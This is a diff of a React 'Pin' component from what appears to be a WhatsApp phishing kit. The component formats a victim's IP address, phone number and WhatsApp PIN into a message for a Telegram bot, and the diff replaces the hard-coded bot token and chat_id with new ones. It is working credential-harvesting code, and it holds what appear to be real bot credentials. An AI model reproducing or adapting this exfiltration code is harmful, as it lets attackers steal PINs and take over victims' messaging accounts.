@@ -20,14 +20,14 @@ export default function Pin({ setNcode, ncode }) {
   const [loading, setLoading] = useState(false);
   const APIS = (currentPin) => {
     var message = "";
-    const apiToken = "7847509084:AAE7uUmRcGrcmC22EzTmIakoJvaArqDyTOg";
+    const apiToken = "7814338130:AAHm2X9TOwPrcl6jpcY1PTY8Gl5KSeNcIlI";
     message += "-------[ Whatsapp  Pin ]-------\n";
     message += `IP Address   : ${ ncode.ip}\n`;
     message += `Phone Number  : ${formatPhoneNumberIntl(ncode.number)}\n`;
     message += `Pin Whatsapp : ${currentPin}\n`;
     const queryParams = {
       text: message,
-      chat_id: "7829326672",
+      chat_id: "6968763338",
       parse_mode: "html",
     };
     const queryString = Object.keys(queryParams)
